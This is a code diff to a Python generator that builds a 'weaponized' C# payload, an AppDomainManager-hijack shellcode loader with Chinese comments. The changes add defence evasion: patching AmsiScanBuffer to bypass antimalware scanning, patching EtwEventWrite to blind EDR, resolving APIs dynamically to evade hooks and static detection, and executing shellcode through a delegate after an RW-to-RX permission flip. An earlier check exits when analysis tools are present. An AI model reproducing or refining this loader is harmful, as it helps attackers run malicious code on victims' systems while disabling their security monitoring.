@@ -72,7 +72,8 @@ def generate_config(exe_name, payload_dll_name, assembly_bindings=""):
 
 def generate_payload_cs(payload_dll_name):
     """
-    生成武器化 C# payload 源码 (进程内 shellcode 执行)
+    生成武器化 C# payload 源码
+    改进: AMSI Bypass + ETW Patch + D/Invoke + RW→RX + Delegate 执行
     """
     cs_template = f"""using System;
 using System.Diagnostics;
@@ -90,36 +91,25 @@ namespace {DEFAULT_NAMESPACE}
         private static byte[] buf = new byte[] {{ }};
 
         // ==========================================================
-        // Win32 API 声明
-        // ==========================================================
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr VirtualAlloc(
-            IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr CreateThread(
-            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
-            IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-        [DllImport("kernel32.dll")]
-        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool VirtualProtect(
-            IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-        // ==========================================================
         // AppDomainManager 入口 (CLR 在 Main() 之前调用)
         // ==========================================================
         public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
         {{
-            new Thread(() => Execute()) {{ IsBackground = true }}.Start();
+            new Thread(() => Run()) {{ IsBackground = true }}.Start();
             base.InitializeNewDomain(appDomainInfo);
         }}
 
+        private static void Run()
+        {{
+            if (buf.Length == 0) return;
+            if (!IsSafe()) return;
+
+            DisableDefenses();
+            Execute();
+        }}
+
         // ==========================================================
-        // 环境检测 (分析工具黑名单)
+        // 环境检测
         // ==========================================================
         private static bool IsSafe()
         {{
@@ -147,38 +137,141 @@ namespace {DEFAULT_NAMESPACE}
         }}
 
         // ==========================================================
-        // Shellcode 执行 (VirtualAlloc + CreateThread)
+        // D/Invoke: 动态解析 ntdll/kernel32 函数地址
+        // 绕过 IAT hook 和静态 P/Invoke 检测
         // ==========================================================
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+        private static extern IntPtr GetModuleHandleA(string lpModuleName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+        private delegate IntPtr DelegateVirtualAlloc(
+            IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        private delegate bool DelegateVirtualProtect(
+            IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        private static IntPtr GetApi(string module, string func)
+        {{
+            IntPtr hMod = GetModuleHandleA(module);
+            if (hMod == IntPtr.Zero) return IntPtr.Zero;
+            return GetProcAddress(hMod, func);
+        }}
+
+        // ==========================================================
+        // AMSI Bypass: Patch AmsiScanBuffer 返回 AMSI_RESULT_CLEAN
+        // ==========================================================
+        private static void PatchAmsi()
+        {{
+            try
+            {{
+                IntPtr hAmsi = GetModuleHandleA("amsi.dll");
+                if (hAmsi == IntPtr.Zero)
+                {{
+                    // amsi.dll 未加载则手动加载后 patch
+                    hAmsi = LoadLib("amsi.dll");
+                    if (hAmsi == IntPtr.Zero) return;
+                }}
+
+                IntPtr addr = GetProcAddress(hAmsi, "AmsiScanBuffer");
+                if (addr == IntPtr.Zero) return;
+
+                // x64 patch: mov eax, 0x80070057 (E_INVALIDARG); ret
+                byte[] patch = {{ 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }};
+
+                // 修改内存保护为 RW
+                IntPtr pVP = GetApi("kernel32.dll", "VirtualProtect");
+                if (pVP == IntPtr.Zero) return;
+                var vp = (DelegateVirtualProtect)Marshal.GetDelegateForFunctionPointer(
+                    pVP, typeof(DelegateVirtualProtect));
+
+                uint oldProtect;
+                vp(addr, (uint)patch.Length, 0x40, out oldProtect);
+                Marshal.Copy(patch, 0, addr, patch.Length);
+                vp(addr, (uint)patch.Length, oldProtect, out oldProtect);
+            }}
+            catch {{ }}
+        }}
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "LoadLibraryW")]
+        private static extern IntPtr LoadLib(string lpLibFileName);
+
+        // ==========================================================
+        // ETW Bypass: Patch EtwEventWrite 直接返回 0
+        // 致盲 EDR 的 .NET assembly 加载事件
+        // ==========================================================
+        private static void PatchEtw()
+        {{
+            try
+            {{
+                IntPtr hNtdll = GetModuleHandleA("ntdll.dll");
+                if (hNtdll == IntPtr.Zero) return;
+
+                IntPtr addr = GetProcAddress(hNtdll, "EtwEventWrite");
+                if (addr == IntPtr.Zero) return;
+
+                // x64 patch: xor eax, eax; ret (return STATUS_SUCCESS)
+                byte[] patch = {{ 0x33, 0xC0, 0xC3 }};
+
+                IntPtr pVP = GetApi("kernel32.dll", "VirtualProtect");
+                if (pVP == IntPtr.Zero) return;
+                var vp = (DelegateVirtualProtect)Marshal.GetDelegateForFunctionPointer(
+                    pVP, typeof(DelegateVirtualProtect));
+
+                uint oldProtect;
+                vp(addr, (uint)patch.Length, 0x40, out oldProtect);
+                Marshal.Copy(patch, 0, addr, patch.Length);
+                vp(addr, (uint)patch.Length, oldProtect, out oldProtect);
+            }}
+            catch {{ }}
+        }}
+
+        private static void DisableDefenses()
+        {{
+            PatchAmsi();
+            PatchEtw();
+        }}
+
+        // ==========================================================
+        // Shellcode 执行
+        // D/Invoke 动态解析 + RW→RX 翻转 + Delegate 回调执行
+        // ==========================================================
+        private delegate void ShellcodeDelegate();
+
         private static void Execute()
         {{
-            if (buf.Length == 0) return;
-            if (!IsSafe()) return;
+            // 动态解析 VirtualAlloc / VirtualProtect
+            IntPtr pVA = GetApi("kernel32.dll", "VirtualAlloc");
+            IntPtr pVP = GetApi("kernel32.dll", "VirtualProtect");
+            if (pVA == IntPtr.Zero || pVP == IntPtr.Zero) return;
 
-            // 分配 RWX 内存
-            IntPtr addr = VirtualAlloc(
+            var virtualAlloc = (DelegateVirtualAlloc)Marshal.GetDelegateForFunctionPointer(
+                pVA, typeof(DelegateVirtualAlloc));
+            var virtualProtect = (DelegateVirtualProtect)Marshal.GetDelegateForFunctionPointer(
+                pVP, typeof(DelegateVirtualProtect));
+
+            // 步骤 1: 分配 RW 内存 (非 RWX，降低检测)
+            IntPtr addr = virtualAlloc(
                 IntPtr.Zero,
                 (uint)buf.Length,
                 0x3000,  // MEM_COMMIT | MEM_RESERVE
-                0x40     // PAGE_EXECUTE_READWRITE
+                0x04     // PAGE_READWRITE
             );
-
             if (addr == IntPtr.Zero) return;
 
-            // 复制 shellcode
+            // 步骤 2: 复制 shellcode 到 RW 内存
             Marshal.Copy(buf, 0, addr, buf.Length);
 
-            // 创建线程执行
-            IntPtr hThread = CreateThread(
-                IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-
-            if (hThread == IntPtr.Zero) return;
-
-            // 等待解密完成后翻转权限: RWX -> RX
-            Thread.Sleep(500);
+            // 步骤 3: 翻转权限 RW → RX (写入完成后再赋予执行权限)
             uint oldProtect;
-            VirtualProtect(addr, (uint)buf.Length, 0x20, out oldProtect); // PAGE_EXECUTE_READ
+            if (!virtualProtect(addr, (uint)buf.Length, 0x20, out oldProtect)) // PAGE_EXECUTE_READ
+                return;
 
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            // 步骤 4: 通过 Delegate 回调执行 (无 CreateThread API 调用)
+            var exec = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(
+                addr, typeof(ShellcodeDelegate));
+            exec();
         }}
     }}
 }}
